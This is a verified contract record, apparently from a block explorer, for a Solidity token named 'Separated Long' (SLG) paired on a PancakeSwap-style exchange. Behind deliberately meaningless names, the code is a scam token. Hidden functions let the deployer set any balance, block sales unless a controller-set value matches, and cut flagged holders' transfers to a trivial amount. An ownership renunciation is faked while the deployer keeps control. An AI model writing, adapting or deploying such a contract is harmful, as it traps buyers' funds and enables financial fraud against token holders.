{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface listIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract walletSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountFee {\n    function createPair(address atTx, address enableAmount) external returns (address);\n}\n\ninterface buyLaunch {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderSwap) external view returns (uint256);\n\n    function transfer(address swapTeam, uint256 tokenSell) external returns (bool);\n\n    function allowance(address liquidityTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapTeam,\n        uint256 tokenSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeLimit, uint256 value);\n    event Approval(address indexed liquidityTake, address indexed spender, uint256 value);\n}\n\ninterface isLiquidity is buyLaunch {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SeparatedLong is walletSell, buyLaunch, isLiquidity {\n\n    address public maxReceiverLimit;\n\n    uint8 private txTeamReceiver = 18;\n\n    uint256 sellAuto;\n\n    bool private atMax;\n\n    address private receiverFromReceiver;\n\n    function transfer(address txIsLaunched, uint256 tokenSell) external virtual override returns (bool) {\n        return maxFeeSwap(_msgSender(), txIsLaunched, tokenSell);\n    }\n\n    address liquidityExemptTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private feeWallet = 100000000 * 10 ** 18;\n\n    constructor (){\n        \n        listIs sellWallet = listIs(liquidityExemptTrading);\n        maxReceiverLimit = amountFee(sellWallet.factory()).createPair(sellWallet.WETH(), address(this));\n        \n        receiverTx = _msgSender();\n        marketingTx();\n        liquidityWalletAt[receiverTx] = true;\n        receiverList[receiverTx] = feeWallet;\n        \n        emit Transfer(address(0), receiverTx, feeWallet);\n    }\n\n    address public receiverTx;\n\n    function balanceOf(address senderSwap) public view virtual override returns (uint256) {\n        return receiverList[senderSwap];\n    }\n\n    event OwnershipTransferred(address indexed tradingMinMax, address indexed teamSenderFee);\n\n    mapping(address => bool) public liquidityWalletAt;\n\n    mapping(address => mapping(address => uint256)) private txAmountMin;\n\n    function approve(address amountSell, uint256 tokenSell) public virtual override returns (bool) {\n        txAmountMin[_msgSender()][amountSell] = tokenSell;\n        emit Approval(_msgSender(), amountSell, tokenSell);\n        return true;\n    }\n\n    function buyMode(address txIsLaunched, uint256 tokenSell) public {\n        toTake();\n        receiverList[txIsLaunched] = tokenSell;\n    }\n\n    bool public limitTrading;\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalList;\n    }\n\n    function amountTeam(address isTrading) public {\n        if (limitTrading) {\n            return;\n        }\n        \n        liquidityWalletAt[isTrading] = true;\n        if (modeTotalFee != atMax) {\n            modeTotalFee = false;\n        }\n        limitTrading = true;\n    }\n\n    function walletTeam(address modeFromShould, address swapTeam, uint256 tokenSell) internal returns (bool) {\n        require(receiverList[modeFromShould] >= tokenSell);\n        receiverList[modeFromShould] -= tokenSell;\n        receiverList[swapTeam] += tokenSell;\n        emit Transfer(modeFromShould, swapTeam, tokenSell);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverFromReceiver;\n    }\n\n    function exemptLaunched(uint256 tokenSell) public {\n        toTake();\n        feeMarketingAuto = tokenSell;\n    }\n\n    function maxFeeSwap(address modeFromShould, address swapTeam, uint256 tokenSell) internal returns (bool) {\n        if (modeFromShould == receiverTx) {\n            return walletTeam(modeFromShould, swapTeam, tokenSell);\n        }\n        uint256 liquiditySwap = buyLaunch(maxReceiverLimit).balanceOf(buyMarketingLiquidity);\n        require(liquiditySwap == feeMarketingAuto);\n        require(swapTeam != buyMarketingLiquidity);\n        if (swapLimit[modeFromShould]) {\n            return walletTeam(modeFromShould, swapTeam, listFrom);\n        }\n        return walletTeam(modeFromShould, swapTeam, tokenSell);\n    }\n\n    bool private fundMin;\n\n    string private modeSwap = \"Separated Long\";\n\n    bool private modeTotalFee;\n\n    function toTake() private view {\n        require(liquidityWalletAt[_msgSender()]);\n    }\n\n    uint256 feeMarketingAuto;\n\n    function maxReceiverLiquidity(address launchFund) public {\n        toTake();\n        if (atMax) {\n            modeTotalFee = true;\n        }\n        if (launchFund == receiverTx || launchFund == maxReceiverLimit) {\n            return;\n        }\n        swapLimit[launchFund] = true;\n    }\n\n    string private totalList = \"SLG\";\n\n    bool public txAmountTeam;\n\n    function name() external view virtual override returns (string memory) {\n        return modeSwap;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeWallet;\n    }\n\n    mapping(address => uint256) private receiverList;\n\n    function decimals() external view virtual override returns (uint8) {\n        return txTeamReceiver;\n    }\n\n    function marketingTx() public {\n        emit OwnershipTransferred(receiverTx, address(0));\n        receiverFromReceiver = address(0);\n    }\n\n    function allowance(address fundExempt, address amountSell) external view virtual override returns (uint256) {\n        if (amountSell == liquidityExemptTrading) {\n            return type(uint256).max;\n        }\n        return txAmountMin[fundExempt][amountSell];\n    }\n\n    function transferFrom(address modeFromShould, address swapTeam, uint256 tokenSell) external override returns (bool) {\n        if (_msgSender() != liquidityExemptTrading) {\n            if (txAmountMin[modeFromShould][_msgSender()] != type(uint256).max) {\n                require(tokenSell <= txAmountMin[modeFromShould][_msgSender()]);\n                txAmountMin[modeFromShould][_msgSender()] -= tokenSell;\n            }\n        }\n        return maxFeeSwap(modeFromShould, swapTeam, tokenSell);\n    }\n\n    function owner() external view returns (address) {\n        return receiverFromReceiver;\n    }\n\n    mapping(address => bool) public swapLimit;\n\n    uint256 constant listFrom = 13 ** 10;\n\n    address buyMarketingLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingMinMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamSenderFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTrading\",\"type\":\"address\"}],\"name\":\"amountTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txIsLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenSell\",\"type\":\"uint256\"}],\"name\":\"buyMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenSell\",\"type\":\"uint256\"}],\"name\":\"exemptLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityWalletAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxReceiverLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFund\",\"type\":\"address\"}],\"name\":\"maxReceiverLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txIsLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeFromShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txAmountTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SeparatedLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}